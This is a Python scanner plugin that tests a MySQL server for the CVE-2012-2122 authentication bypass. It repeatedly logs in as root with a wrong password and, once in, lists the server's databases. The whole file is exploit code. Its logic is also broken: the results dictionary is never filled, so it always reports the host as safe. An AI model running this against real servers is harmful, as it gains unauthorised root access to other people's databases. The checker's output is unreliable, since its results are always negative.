# coding:utf-8

import pymysql
import time
import traceback

def verify(protocol,ip,port):
    if protocol == '':
        url = ip+':'+str(port)
    else:
        url = protocol+'://'+ip+':'+str(port)
    print('testing if mysql auth bypass without password vul(cve-2012-2122)')
    user = 'root'
    pwd = '123123'
    results = {}
    tmp_databases = []
    flag = 0
    i = 0
    while i < 26:
        try:
            db = pymysql.connect(host=ip, port=int(port), user=user, passwd=pwd, connect_timeout=10)
            if db.open:
                curs = db.cursor()
                curs.execute("show databases;")
                datas = curs.fetchall()
                if len(datas) > 0:
                    for data in datas:
                        a = (data[0])
                        tmp_databases.append(a)
                databases = ','.join(tmp_databases)
                msg = 'There is mysql auth bypass without password vul(cve-2012-2122) on: %s , with database: %s .' % (url, databases)
            break
        except Exception as e:
            if 'Can\'t connect' in traceback.format_exc():
                flag = flag + 1
                if flag >= 5:
                    break
            else:
                i = i + 1
    if len(results) > 0:
        vulinfo = msg
        print(vulinfo)
        number = 'v125'
        return True,url,number,msg
    else:
        msg = 'Therer is no mysql auth bypass without password vul(cve-2012-2122) in url:' + url + '.'
        number = 'v0'
        return False, url, number, msg
